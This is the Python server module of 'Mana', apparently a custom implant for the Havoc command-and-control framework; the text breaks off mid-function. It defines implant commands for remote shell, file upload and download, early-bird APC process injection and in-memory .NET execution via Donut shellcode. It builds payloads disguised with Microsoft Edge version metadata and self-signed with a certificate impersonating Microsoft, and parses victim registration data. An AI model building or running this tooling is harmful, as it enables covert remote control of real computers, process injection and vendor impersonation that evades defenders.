from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

import ast
import os
import subprocess
import re
import random
import tempfile
import secrets

COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102

COMMAND_SHELL            = 0x152
COMMAND_UPLOAD           = 0x153
COMMAND_DOWNLOAD         = 0x154
COMMAND_EXIT             = 0x155

COMMAND_OUTPUT           = 0x200

# Situational Awareness

COMMAND_WHOAMI           = 0x300

COMMAND_PWD              = 0x400
COMMAND_CD               = 0x401
COMMAND_LS               = 0x402

# Process injection

COMMAND_EBAPC            = 0x600

COMMAND_EXECUTE_ASSEMBLY = 0x160


# ==============================
# ===== Configuration ==========
# ==============================

SIGNING_DIR = "./scripts/signing"
KEY_FILE = f"{SIGNING_DIR}/key.pem"
CERT_FILE = f"{SIGNING_DIR}/cert.pem"
PFX_FILE = f"{SIGNING_DIR}/sign.pfx"
PASSWORDS_FILE = f"{SIGNING_DIR}/password.txt"

DONUT_PATH = "/home/kali/mdev/donut"
PROFILE_PATH = "/home/kali/c2/Havoc/profiles/wkl_sample.yaotl"
CONFIG_OUTPUT = "./Include/Config.h"
RESOURCE_RC_CONFIG_OUTPUT = "./Include/Resource.rc"


def generate_random_password(length: int = 24) -> str:
    """Generate a cryptographically secure random password"""
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(secrets.choice(alphabet) for _ in range(length))


def save_passwords(key_password: str, pfx_password: str, cert_info: dict = None) -> str:
    """Save passwords to file and return the file path"""
    
    os.makedirs(SIGNING_DIR, exist_ok=True)
    
    content = f"""# Mana Code Signing Credentials
# Generated: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ==========================================

KEY_PASSWORD={key_password}
PFX_PASSWORD={pfx_password}

# File locations:
# Key:  {KEY_FILE}
# Cert: {CERT_FILE}
# PFX:  {PFX_FILE}
"""

    if cert_info:
        content += f"""
# Certificate Info:
# Country:      {cert_info.get('country', 'N/A')}
# State:        {cert_info.get('state', 'N/A')}
# City:         {cert_info.get('city', 'N/A')}
# Organization: {cert_info.get('org', 'N/A')}
# Unit:         {cert_info.get('ou', 'N/A')}
# Common Name:  {cert_info.get('cn', 'N/A')}
# Email:        {cert_info.get('email', 'N/A')}
"""
    
    with open(PASSWORDS_FILE, 'w') as f:
        f.write(content)
    
    # Set restrictive permissions (owner read/write only)
    os.chmod(PASSWORDS_FILE, 0o600)
    
    return PASSWORDS_FILE


def generate_codesigning_cert(signing_config: dict) -> tuple:
    """
    Generate self-signed code signing certificate with random passwords.
    Returns (success: bool, message: str, passwords: dict)
    """
    
    os.makedirs(SIGNING_DIR, exist_ok=True)
    
    # Generate random passwords
    key_password = generate_random_password(24)
    pfx_password = generate_random_password(24)
    
    # Get signing config
    country = signing_config.get('Country Name (2 letter code) [AU]', 'US')
    state = signing_config.get('State or Province Name (full name) [Some-State]', 'Washington')
    city = signing_config.get('Locality Name (eg, city) []', 'Redmond')
    org = signing_config.get('Organization Name (eg, company) [Internet Widgits Pty Ltd]', 'Microsoft Corporation')
    ou = signing_config.get('Organizational Unit Name (eg, section) []', 'Windows Security')
    cn = signing_config.get('Common Name (e.g. server FQDN or YOUR name) []', 'Microsoft Windows Publisher')
    email = signing_config.get('Email Address []', 'code-signing@microsoft.com')
    
    subject = f"/C={country}/ST={state}/L={city}/O={org}/OU={ou}/CN={cn}/emailAddress={email}"
    
    cert_info = {
        'country': country,
        'state': state,
        'city': city,
        'org': org,
        'ou': ou,
        'cn': cn,
        'email': email
    }
    
    passwords = {
        'key': key_password,
        'pfx': pfx_password
    }
    
    try:
        # Generate private key and self-signed certificate
        cmd_cert = [
            'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
            '-keyout', KEY_FILE,
            '-out', CERT_FILE,
            '-sha256', '-days', '365',
            '-subj', subject,
            '-passout', f'pass:{key_password}'
        ]
        
        result = subprocess.run(cmd_cert, capture_output=True, text=True)
        if result.returncode != 0:
            return False, f"Certificate generation failed: {result.stderr}", None
        
        # Export to PKCS#12 (PFX)
        cmd_pfx = [
            'openssl', 'pkcs12', '-export',
            '-inkey', KEY_FILE,
            '-in', CERT_FILE,
            '-out', PFX_FILE,
            '-passin', f'pass:{key_password}',
            '-passout', f'pass:{pfx_password}',
            '-name', cn
        ]
        
        result = subprocess.run(cmd_pfx, capture_output=True, text=True)
        if result.returncode != 0:
            return False, f"PFX export failed: {result.stderr}", None
        
        # Save passwords to file
        passwords_file = save_passwords(key_password, pfx_password, cert_info)
        
        return True, f"Certificate generated (passwords saved to {passwords_file})", passwords
        
    except Exception as e:
        return False, f"Certificate generation error: {str(e)}", None


def sign_executable(exe_path: str, output_path: str, pfx_password: str, description: str = "Signed Application") -> tuple:
    """
    Sign an executable using osslsigncode.
    Returns (success: bool, message: str)
    """
    
    if not os.path.exists(PFX_FILE):
        return False, f"PFX file not found: {PFX_FILE}"
    
    if not os.path.exists(exe_path):
        return False, f"Input EXE not found: {exe_path}"
    
    try:
        cmd = [
            'osslsigncode', 'sign',
            '-pkcs12', PFX_FILE,
            '-pass', pfx_password,
            '-n', description,
            '-t', 'http://timestamp.digicert.com',
            '-in', exe_path,
            '-out', output_path
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            return False, f"Signing failed: {result.stderr}"
        
        if not os.path.exists(output_path):
            return False, "Signed file not created"
        
        return True, f"Signed: {output_path}"
        
    except FileNotFoundError:
        return False, "osslsigncode not found. Install with: apt install osslsigncode"
    except Exception as e:
        return False, f"Signing error: {str(e)}"


def verify_signature(exe_path: str) -> tuple:
    """Verify executable signature."""
    try:
        cmd = ['osslsigncode', 'verify', exe_path]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            return True, "Signature valid"
        else:
            return False, f"Signature invalid: {result.stdout}"
            
    except Exception as e:
        return False, f"Verification error: {str(e)}"


# ====================
# ===== Commands =====
# ====================

# execute .NET in another exe by utilizing donut shellcode
class CommandExecuteAssembly(Command):
    CommandId   = COMMAND_EXECUTE_ASSEMBLY
    Name        = "execute-assembly"
    Description = "Execute .NET assembly in remote process"
    Help        = "Usage: execute-assembly <assembly_file> [arguments] [runtime]"
    Mitr        = []
    NeedAdmin   = False
    Params      = [
        CommandParam(name="assembly", is_file_path=True, is_optional=False),
        CommandParam(name="arguments", is_file_path=False, is_optional=True),
        CommandParam(name="runtime", is_file_path=False, is_optional=True)
    ]

    def assembly_to_shellcode(self, assembly_bytes: bytes, arguments: str = "", runtime: str = "v4") -> bytes:
        """Convert .NET assembly to shellcode using Donut"""
        runtime_map = {
            "v2": "v2.0.50727",
            "v4": "v4.0.30319",
            "2": "v2.0.50727",
            "4": "v4.0.30319",
        }
        clr_version = runtime_map.get(runtime.lower() if runtime else "v4", "v4.0.30319")
        
        # Write assembly to temp file
        with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as f:
            f.write(assembly_bytes)
            assembly_path = f.name
        
        shellcode_path = assembly_path + '.bin'
        
        try:
            # Run Donut
            cmd = [
                DONUT_PATH,
                '-i', assembly_path,
                '-o', shellcode_path,
                '-a', '2',
                '-f', '1',
                '-t',
                '-r', clr_version
            ]
            
            # Only add arguments if provided and not empty
            if arguments and arguments.strip():
                cmd.extend(['-p', arguments])
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                return None
            
            # Read shellcode
            with open(shellcode_path, 'rb') as f:
                shellcode = f.read()
            
            return shellcode
            
        finally:
            # Cleanup
            if os.path.exists(assembly_path):
                os.remove(assembly_path)
            if os.path.exists(shellcode_path):
                os.remove(shellcode_path)

    def job_generate(self, arguments: dict) -> bytes:
        Task = Packer()
        Task.add_int(self.CommandId)
        
        # Spawn process
        spawn = "C:\\Windows\\System32\\msiexec.exe"
        Task.add_data(spawn.encode())
        
        # Get assembly (required)
        assembly_b64 = arguments.get('assembly', '')
        
        if not assembly_b64:
            # No assembly provided, send empty shellcode
            Task.add_data(b'')
            return Task.buffer
        
        # Get optional arguments - default to empty string (no args)
        args = arguments.get('arguments', None)
        if args is None or args == '':
            args = ''  # No arguments - let assembly use its default behavior
        
        # Get optional runtime - default to v4
        runtime = arguments.get('runtime', None)
        if runtime is None or runtime == '':
            runtime = 'v4'
        
        try:
            assembly_bytes = b64decode(assembly_b64)
            shellcode = self.assembly_to_shellcode(assembly_bytes, args, runtime)
            
            if shellcode:
                Task.add_data(shellcode)
            else:
                Task.add_data(b'')
        except Exception as e:
            Task.add_data(b'')
        
        return Task.buffer

class CommandEbapc( Command ):
    CommandId   = COMMAND_EBAPC
    Name        = "ebapc"
    Description = "Early Bird APC injection"
    Help        = "Usage: ebapc <process_path> <shellcode_file>"
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="process_name",
            is_file_path=False,
            is_optional=False
        ),
        CommandParam(
            name="local_file",
            is_file_path=True,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task        = Packer()
        Processname = arguments[ 'process_name' ]
        local_file    = b64decode( arguments[ 'local_file' ] )
        Task.add_int( self.CommandId )
        Task.add_data( Processname )
        Task.add_data( local_file )
        return Task.buffer


class CommandLs(Command):
    CommandId   = COMMAND_LS
    Name        = "ls"
    Description = "list files in directory"
    Help        = "Usage: ls [path]"
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="path", 
            is_file_path=False, 
            is_optional=True
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_int( self.CommandId )
        path = arguments.get('path', '')
        Task.add_data(path)
        return Task.buffer

class CommandCd(Command):
    CommandId   = COMMAND_CD
    Name        = "cd"
    Description = "change working directory"
    Help        = "Usage: cd [path]"
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="path", 
            is_file_path=False, 
            is_optional=False)
        ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_int( self.CommandId )
        path = arguments.get('path', '')
        Task.add_data(path)
        return Task.buffer

class CommandPwd(Command):
    CommandId   = COMMAND_PWD
    Name        = "pwd"
    Description = "Get current working directory"
    Help        = "Usage: pwd"
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_int( self.CommandId )
        return Task.buffer

class CommandWhoami(Command):
    CommandId   = COMMAND_WHOAMI
    Name        = "whoami"
    Description = "executes whoami command"
    Help        = "Usage: whoami"
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_int( self.CommandId )
        return Task.buffer

class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands using cmd.exe"
    Help = "shell whoami /priv"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_int( self.CommandId )
        Task.add_data( "c:\\windows\\system32\\cmd.exe /c " + arguments[ 'commands' ] )
        return Task.buffer


class CommandUpload( Command ):
    CommandId   = COMMAND_UPLOAD
    Name        = "upload"
    Description = "uploads a file to the host"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="local_file",
            is_file_path=True,
            is_optional=False
        ),
        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]
        fileData    = b64decode( arguments[ 'local_file' ] )
        Task.add_int( self.CommandId )
        Task.add_data( remote_file )
        Task.add_data( fileData )
        return Task.buffer


class CommandDownload( Command ):
    CommandId   = COMMAND_DOWNLOAD
    Name        = "download"
    Description = "downloads the requested file"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        ),
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]
        Task.add_int( self.CommandId )
        Task.add_data( remote_file )
        return Task.buffer


class CommandExit( Command ):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the Mana agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:
        print("exiting process...")
        Task = Packer()
        Task.add_int( self.CommandId )
        return Task.buffer


def generate_shellcode_from_exe(exe_path):
    """Convert compiled EXE to shellcode using Donut"""
    
    bin_path = exe_path.replace(".exe", ".bin")
    
    cmd = [DONUT_PATH, "-i", exe_path, "-o", bin_path, "-a", "2", "-f", "1"]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0 and os.path.exists(bin_path):
        with open(bin_path, "rb") as f:
            return f.read()
    
    return None


# ==============================
# ===== Profile Parser =========
# ==============================

def HavocProfileParser(profile: str = PROFILE_PATH, listener_name: str = None) -> dict:
    """
    Parse Havoc profile and return listener config.
    """
    FIELDS = {
        "Name": str,
        "Hosts": list,
        "PortBind": int,
        "Secure": bool,
        "UserAgent": str,
        "Uris": list,
        "Headers": list,
    }
    
    listeners = []
    current = {}
    in_http = False
    brace_depth = 0
    in_nested = False
    
    with open(profile, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            
            if not line or line.startswith('#'):
                continue
            
            if re.match(r'^Http\s*\{', line):
                in_http = True
                brace_depth = 1
                in_nested = False
                current = {}
                continue
            
            if in_http:
                open_braces = line.count('{')
                close_braces = line.count('}')
                
                if open_braces > 0:
                    in_nested = True
                    brace_depth += open_braces
                    continue
                
                if close_braces > 0:
                    brace_depth -= close_braces
                    if brace_depth == 1:
                        in_nested = False
                    if brace_depth <= 0:
                        if current:
                            listeners.append(current.copy())
                        in_http = False
                        in_nested = False
                        current = {}
                    continue
                
                if in_nested:
                    continue
                
                if "=" in line:
                    key, value = map(str.strip, line.split("=", 1))
                    
                    if key not in FIELDS:
                        continue
                    
                    if value.lower() == "false":
                        value = "False"
                    elif value.lower() == "true":
                        value = "True"
                    
                    try:
                        current[key] = ast.literal_eval(value)
                    except (ValueError, SyntaxError):
                        current[key] = value
    
    if listener_name:
        for listener in listeners:
            if listener.get('Name') == listener_name:
                return listener
        return {}
    
    return listeners[0] if listeners else {}


# ==============================
# ===== Config.h Generator =====
# ==============================

def generate_config_header(listener: dict, sleep: int, jitter: int, magic: int) -> str:
    """
    Generate config.h from listener configuration.
    """
    
    def c_escape(s):
        if s is None:
            return ""
        return str(s).replace('\\', '\\\\').replace('"', '\\"')
    
    # Extract values
    hosts = listener.get('Hosts', ['127.0.0.1'])
    port = listener.get('PortBind', 80)
    secure = listener.get('Secure', False)
    user_agent = listener.get('UserAgent', 'Mozilla/5.0')
    uris = listener.get('Uris', ['/'])
    headers = listener.get('Headers', [])
    
    host = hosts[0] if hosts else '127.0.0.1'
    endpoint = random.choice(uris) if uris else '/'
    
    # Build headers section
    # headers_section = ""
    # for i, h in enumerate(headers):
    #     headers_section += f'#define CONFIG_HEADER_{i} L"{c_escape(h)}\\r\\n"\n'
    # headers_section += f'#define CONFIG_HEADER_COUNT {len(headers)}'

    # Build individual header defines
    header_defines = ""
    for i, h in enumerate(headers):
        header_defines += '#define CONFIG_HEADER_' + str(i) + ' L"' + c_escape(h) + '\\r\\n"\n'
    
    # Build headers array items (referencing the defines)
    header_array_items = ""
    for i in range(len(headers)):
        header_array_items += '    CONFIG_HEADER_' + str(i) + ',\n'
    
    config_h = f'''#include <windows.h>
// =============================================================================
// NETWORK CONFIGURATION (from Havoc Listener)
// =============================================================================
#define CONFIG_HOST         L"{c_escape(host)}"
#define CONFIG_PORT         {port}
#define CONFIG_SECURE       {'TRUE' if secure else 'FALSE'}
#define CONFIG_ENDPOINT     L"{c_escape(endpoint)}"
#define CONFIG_USER_AGENT    L"{c_escape(user_agent)}"

// =============================================================================
// TIMING CONFIGURATION (from Havoc Agent Settings)
// =============================================================================
#define CONFIG_SLEEP        {sleep * 1000}   // milliseconds
#define CONFIG_JITTER       {jitter}     // percentage (0-100)

// =============================================================================
// HTTP HEADERS (from Havoc Listener Profile)
// =============================================================================
{header_defines}#define CONFIG_HEADER_COUNT {len(headers)}

// Headers array for iteration
static LPCWSTR CONFIG_HEADERS[] = {{
{header_array_items}}};

// =============================================================================
// AGENT IDENTIFICATION
// =============================================================================
#define CONFIG_MAGIC        0x{magic:08X}
'''
    
    return config_h




# ==============================
# ===== Agent Type =============
# ==============================

class Mana(AgentType):

    Name        = "Mana"
    Author      = "damaidec"
    Version     = "0.3"
    Description = f"""3rd party agent for Havoc"""
    MagicValue  = 0x6d616e61  # 'mana'

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe",
        },
        {
            "Name": "Windows DLL",
            "Extension": "dll",
        },
        {
            "Name": "Windows Shellcode",
            "Extension": "bin",
        },
    ]

    BuildingConfig = {
        "1. Jitter": "20",
        "2. Sleep": "10",
        "3. ResourceSection": {
        "FILEVERSION":"146, 0, 3856, 109",
        "PRODUCTVERSION": "146, 0, 3856, 109",
        "CompanyName": "Microsoft",
        "FileDescription": "Microsoft Edge",
        "InternalName": "Msedge",
        "LegalCopyright": "Copyright Microsoft Corporation. All rights reserved.",
        "OriginalFilename": "msedge.exe",
        "ProductName": "Microsoft Edge",
        "ProductVersion": "146.0.3856.109",
        },
        "4. SignPayload": False,
        "5. CodeSigning": {
        "Country Name (2 letter code) [AU]": "US",
        "State or Province Name (full name) [Some-State]": "Washington",
        "Locality Name (eg, city) []": "Redmond",
        "Organization Name (eg, company) [Internet Widgits Pty Ltd]": "Microsoft Corporation",
        "Organizational Unit Name (eg, section) []": "Windows Security",
        "Common Name (e.g. server FQDN or YOUR name) []": "Microsoft Windows Publisher",
        "Email Address []": "code-signing@microsoft.com",
        },
        "6. Checkbox": False,
        "7. Dropdown":{"Method":["test","test2"]}

    }

    Commands = [
        CommandShell(),
        CommandUpload(),
        CommandDownload(),
        CommandExit(),
        CommandWhoami(),
        CommandPwd(),
        CommandCd(),
        CommandLs(),
        CommandEbapc(),
        CommandExecuteAssembly(),
    ]


    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
    def generate(self, config: dict) -> None:
        """
        Generate payload - called from Havoc UI
        """
        print(f"config: {config}")
        
        # Get listener name from UI
        listener_name = config['Options']['Listener']['Name']
        # Get sleep/jitter from build config
        sleep = int(config['Config'].get('2. Sleep', '10'))
        jitter = int(config['Config'].get('1. Jitter', '20'))

         # Check if signing is enabled
        sign_payload = config['Config'].get('4. SignPayload', False)
        should_sign = sign_payload

        # Config build for resource RC
        compname = config['Config']['3. ResourceSection'].get('CompanyName')
        filever = config['Config']['3. ResourceSection'].get('FILEVERSION')
        filedesc = config['Config']['3. ResourceSection'].get('FileDescription')
        internalName = config['Config']['3. ResourceSection'].get('InternalName')
        copyright = config['Config']['3. ResourceSection'].get('LegalCopyright')
        origfilename = config['Config']['3. ResourceSection'].get('OriginalFilename')
        productver = config['Config']['3. ResourceSection'].get('PRODUCTVERSION')
        productname = config['Config']['3. ResourceSection'].get('ProductName')
        productversion = config['Config']['3. ResourceSection'].get('ProductVersion')

        self.builder_send_message(config['ClientID'], "Info", f"[*] Listener: {listener_name}")
        self.builder_send_message(config['ClientID'], "Info", f"[*] Sleep: {sleep}s, Jitter: {jitter}%")


        if should_sign:
            self.builder_send_message(config['ClientID'], "Info", "[*] Code signing: ENABLED")
        
        result = subprocess.run(
        ["python3", "hash.py"],
        capture_output=True,
        text=True,
        cwd="scripts")

        if result.returncode != 0:
            print(f"[!] hash.py error: {result.stderr}")
        else:
            print(f"[+] hash.py output: {result.stdout}")
        hash_output = result.stdout.strip()
    
        # Extract the seed value
        for line in hash_output.split('\n'):
            if 'Using hash seed' in line:
                seed = line.split(':')[-1].strip()
                self.builder_send_message(config['ClientID'], "Info", f"[*] Generated API hashes with seed: {seed}")
            break

        # Parse profile to get listener config
        listener = HavocProfileParser(PROFILE_PATH, listener_name)
        
        if not listener:
            self.builder_send_message(config['ClientID'], "Error", f"[!] Listener '{listener_name}' not found!")
            return
        
        self.builder_send_message(config['ClientID'], "Good", f"[+] Found listener: {listener.get('Name')}")
        self.builder_send_message(config['ClientID'], "Info", f"    Host: {listener.get('Hosts', ['?'])[0]}:{listener.get('PortBind', '?')}")
        
        # Generate config.h
        config_h = generate_config_header(
            listener=listener,
            sleep=sleep,
            jitter=jitter,
            magic=self.MagicValue
        )

        # Generate resource.rc config
        Resourceconfig_h = f'''
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE 9, 1

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE  
BEGIN
    "resource.h\\0"
END

2 TEXTINCLUDE  
BEGIN
    "#include ""winres.h""\\r\\n"
    "\\0"
END

3 TEXTINCLUDE  
BEGIN
    "\\r\\n"
    "\\0"
END

#endif    // APSTUDIO_INVOKED

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED
1 VERSIONINFO
FILEVERSION {filever}
PRODUCTVERSION {productver}
FILEFLAGSMASK 0x0L
#ifdef _DEBUG
FILEFLAGS 0x1L
#else
FILEFLAGS 0x0L
#endif
FILEOS 0x0L
FILETYPE 0x0L
FILESUBTYPE 0x0L
BEGIN
BLOCK "StringFileInfo"
BEGIN
BLOCK "040904B0" //English US, Unicode code page
BEGIN
VALUE "CompanyName", "{compname}"
VALUE "FileDescription", "{filedesc}"
VALUE "InternalName", "{internalName}"
VALUE "LegalCopyright", "{copyright}"
VALUE "OriginalFilename", "{origfilename}"
VALUE "ProductName", "{productname}"
VALUE "ProductVersion", "{productversion}"
END
END
BLOCK "VarFileInfo"
BEGIN
VALUE "Translation", 0x409, 1200
END
END
        '''

        
        
        # Write config.h
        with open(CONFIG_OUTPUT, 'w') as f:
            f.write(config_h)

        # Write resource.rc 
        with open(RESOURCE_RC_CONFIG_OUTPUT, 'w') as f:
             f.write(Resourceconfig_h)
        
        self.builder_send_message(config['ClientID'], "Good", f"[+] Generated: {CONFIG_OUTPUT}")
        self.builder_send_message(config['ClientID'], "Good", f"[+] Generated: {RESOURCE_RC_CONFIG_OUTPUT}")
        
        # Clean and recompile with new Defines.h + Config.h
        self.builder_send_message(config['ClientID'], "Info", "[*] Compiling...")
        
        subprocess.run(["make", "clean"], capture_output=True, text=True)
        build = subprocess.run(["make"], capture_output=True, text=True)
    
        if build.returncode != 0:
            self.builder_send_message(config['ClientID'], "Error", f"[!] Build failed:\n{build.stderr}")
            return
        
        self.builder_send_message(config['ClientID'], "Good", "[+] Build successful")

        # exe paths
        unsigned_exe = "./Bin/Mana.exe"
        signed_exe = "./Bin/Mana_signed.exe"
        if config['Options']['Format'] == "Windows Shellcode":
            self.builder_send_message(config['ClientID'], "Info", "[*] Converting to shellcode...")
            shellcode = generate_shellcode_from_exe(unsigned_exe)
            
            if shellcode:
                self.builder_send_message(config['ClientID'], "Good", f"[+] Shellcode size: {len(shellcode)} bytes")
                self.builder_send_payload(config['ClientID'], f"{self.Name}.bin", shellcode)
            else:
                self.builder_send_message(config['ClientID'], "Error", "[!] Shellcode generation failed")

        elif config['Options']['Format'] == "Windows Executable":
            # Generate unsigned exe first

            # Read compiled binary
            with open(unsigned_exe, "rb") as f:
                unsigned_data = f.read()
        
            self.builder_send_message(config['ClientID'], "Good", f"[+] Unsigned EXE size: {len(unsigned_data)} bytes")
            self.builder_send_payload(config['ClientID'], f"{self.Name}.exe", unsigned_data)

            # Code signing

            if should_sign:
                self.builder_send_message(config['ClientID'], "Info", "[*] Generating code signing certificate...")
            
                # Generate certificate with random passwords
                success, msg, passwords = generate_codesigning_cert(config['Config'].get('5. CodeSigning', {}))
                
                if success and passwords:
                    self.builder_send_message(config['ClientID'], "Good", f"[+] {msg}")
                    
                    # Display passwords in console
                    self.builder_send_message(config['ClientID'], "Info", "[*] ========== SIGNING CREDENTIALS ==========")
                    self.builder_send_message(config['ClientID'], "Info", f"[*] Key Password: {passwords['key']}")
                    self.builder_send_message(config['ClientID'], "Info", f"[*] PFX Password: {passwords['pfx']}")
                    self.builder_send_message(config['ClientID'], "Info", f"[*] Saved to: {PASSWORDS_FILE}")
                    self.builder_send_message(config['ClientID'], "Info", "[*] ==========================================")
                    
                    # Also print to terminal
                    print("\n" + "=" * 50)
                    print("CODE SIGNING CREDENTIALS")
                    print("=" * 50)
                    print(f"Key Password: {passwords['key']}")
                    print(f"PFX Password: {passwords['pfx']}")
                    print(f"Saved to:     {PASSWORDS_FILE}")
                    print("=" * 50 + "\n")
                    
                else:
                    self.builder_send_message(config['ClientID'], "Error", f"[!] {msg}")
                    self.builder_send_message(config['ClientID'], "Info", "[*] Skipping signed version")
                    return
                
                self.builder_send_message(config['ClientID'], "Info", "[*] Signing executable...")
                
                # Sign the EXE using the generated password
                success, msg = sign_executable(
                    exe_path=unsigned_exe,
                    output_path=signed_exe,
                    pfx_password=passwords['pfx'],
                    description=filedesc
                )
                
                if success:
                    self.builder_send_message(config['ClientID'], "Good", f"[+] {msg}")
                    
                    # Verify signature
                    verify_success, verify_msg = verify_signature(signed_exe)
                    if verify_success:
                        self.builder_send_message(config['ClientID'], "Good", "[+] Signature verified")
                    else:
                        self.builder_send_message(config['ClientID'], "Info", f"[*] Verification: {verify_msg}")
                    
                    # Send signed EXE
                    with open(signed_exe, "rb") as f:
                        signed_data = f.read()
                    
                    self.builder_send_message(config['ClientID'], "Good", f"[+] Signed EXE size: {len(signed_data)} bytes")
                    self.builder_send_payload(config['ClientID'], f"{self.Name}_signed.exe", signed_data)
                    
                    # Summary
                    self.builder_send_message(config['ClientID'], "Good", "[+] ========== OUTPUT FILES ==========")
                    self.builder_send_message(config['ClientID'], "Info", f"    1. {self.Name}.exe (unsigned)")
                    self.builder_send_message(config['ClientID'], "Info", f"    2. {self.Name}_signed.exe (signed)")
                    self.builder_send_message(config['ClientID'], "Info", f"    3. {PASSWORDS_FILE} (credentials)")
                    self.builder_send_message(config['ClientID'], "Good", "[+] =====================================")
                else:
                    self.builder_send_message(config['ClientID'], "Error", f"[!] Signing failed: {msg}")
        else:
            self.builder_send_message(config['ClientID'], "Info", "[*] Something failes check agent.py...")
    
    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
    def response(self, response: dict) -> bytes:
        """
        Handle incoming agent requests
        """
        agent_header    = response["AgentHeader"]
        agent_response  = b64decode(response["Response"])
        response_parser = Parser(agent_response, len(agent_response))
        Command         = response_parser.parse_int()

        print(f"agent header: {agent_header}")
        print(f"agent response: {agent_response}")
        print(f"Response parser: {response_parser}")
        print(f"Command issued: {hex(Command)}")

        print(f"Agent: {response["Agent"]}")

        hex_command = hex(Command)
        if response["Agent"] is None:
            # so when the Agent field is empty this either means that the agent doesn't exists.
            print("youre hitting agent is none")

            if Command == COMMAND_REGISTER:
                print("[*] Is agent register request")

                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]

                RegisterInfo = {
                    "AgentID":          response_parser.parse_int(),
                    "Hostname":         response_parser.parse_str(),
                    "Username":         response_parser.parse_str(),
                    "Domain":           response_parser.parse_str(),
                    "InternalIP":       response_parser.parse_str(),
                    "Process Path":     response_parser.parse_str(),
                    "Process ID":       str(response_parser.parse_int()),
                    "Process Parent ID": str(response_parser.parse_int()),
                    "Process Arch":     response_parser.parse_int(),
                    "Process Elevated": response_parser.parse_int(),
                    "OS Build":         str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()),
                    "OS Arch":          response_parser.parse_int(),
                    "SleepDelay":       response_parser.parse_int(),
                }
                # this OS info is going to be displayed on the GUI Session table.

                RegisterInfo["Process Name"] = RegisterInfo["Process Path"].split("\\")[-1]
                RegisterInfo["OS Version"] = RegisterInfo["OS Build"]

                if RegisterInfo[ "OS Arch" ] == 0:
                    RegisterInfo[ "OS Arch" ] = "x86"
                elif RegisterInfo[ "OS Arch" ] == 9:
                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
                elif RegisterInfo[ "OS Arch" ] == 5:
                    RegisterInfo[ "OS Arch" ] = "ARM"
                elif RegisterInfo[ "OS Arch" ] == 12:
                    RegisterInfo[ "OS Arch" ] = "ARM64"
                elif RegisterInfo[ "OS Arch" ] == 6:
                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
                else:
